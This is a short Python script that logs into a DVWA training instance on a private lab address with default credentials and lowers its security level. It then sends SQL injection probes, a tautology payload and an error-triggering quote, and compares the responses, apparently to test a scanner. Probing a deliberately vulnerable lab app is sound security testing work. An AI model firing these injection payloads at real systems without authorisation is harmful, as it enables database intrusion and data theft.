import asyncio
import httpx


async def test_sqli():
    async with httpx.AsyncClient(follow_redirects=True, timeout=30) as c:
        # Login
        resp = await c.get("http://192.168.18.131/dvwa/login.php")
        data = {"username": "admin", "password": "password", "Login": "Login"}
        resp = await c.post("http://192.168.18.131/dvwa/login.php", data=data)
        print(f"Login OK: {resp.url}")

        # Set security low
        resp = await c.get("http://192.168.18.131/dvwa/security.php")
        import re
        m = re.search(r'name="user_token"\s+value="([^"]+)"', resp.text)
        token = m.group(1) if m else ""
        sec_data = {"security": "low", "seclev_submit": "Submit"}
        if token:
            sec_data["user_token"] = token
        resp = await c.post("http://192.168.18.131/dvwa/security.php", data=sec_data)
        print(f"Security low OK")

        # Test SQLi page with normal request
        resp = await c.get("http://192.168.18.131/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit")
        print(f"\nNormal response (id=1):")
        print(f"  Status: {resp.status_code}")
        print(f"  Length: {len(resp.text)}")
        # Look for SQL result indicators
        if "First name" in resp.text:
            print("  Has 'First name' (SQL result)")
        if "Surname" in resp.text:
            print("  Has 'Surname' (SQL result)")
        if "ID:" in resp.text:
            print("  Has 'ID:' (query echo)")

        # Test with SQLi payload
        resp2 = await c.get("http://192.168.18.131/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit")
        print(f"\nSQLi payload (1' OR '1'='1):")
        print(f"  Status: {resp2.status_code}")
        print(f"  Length: {len(resp2.text)}")
        if "First name" in resp2.text:
            print("  Has 'First name' (SQL result)")
        # Count number of results
        count = resp2.text.count("First name")
        print(f"  'First name' count: {count}")
        count_normal = resp.text.count("First name")
        print(f"  Normal 'First name' count: {count_normal}")

        # Test with error-based
        resp3 = await c.get("http://192.168.18.131/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit")
        print(f"\nError-based (1'):")
        print(f"  Status: {resp3.status_code}")
        print(f"  Length: {len(resp3.text)}")
        if "error" in resp3.text.lower() or "sql" in resp3.text.lower() or "mysql" in resp3.text.lower():
            print("  Has SQL error!")
            # Find the error
            import re
            errors = re.findall(r'(error.*?)(?:<|$)', resp3.text, re.IGNORECASE)
            for e in errors[:3]:
                print(f"  Error: {e[:200]}")
        else:
            print("  No SQL error visible")

        # Check what parameters the scanner would see
        print(f"\nDVWA SQLi page form:")
        forms = re.findall(r'<form[^>]*>(.*?)</form>', resp.text, re.DOTALL)
        for f in forms[:2]:
            inputs = re.findall(r'<input[^>]*>', f)
            for inp in inputs:
                print(f"  {inp}")


asyncio.run(test_sqli())
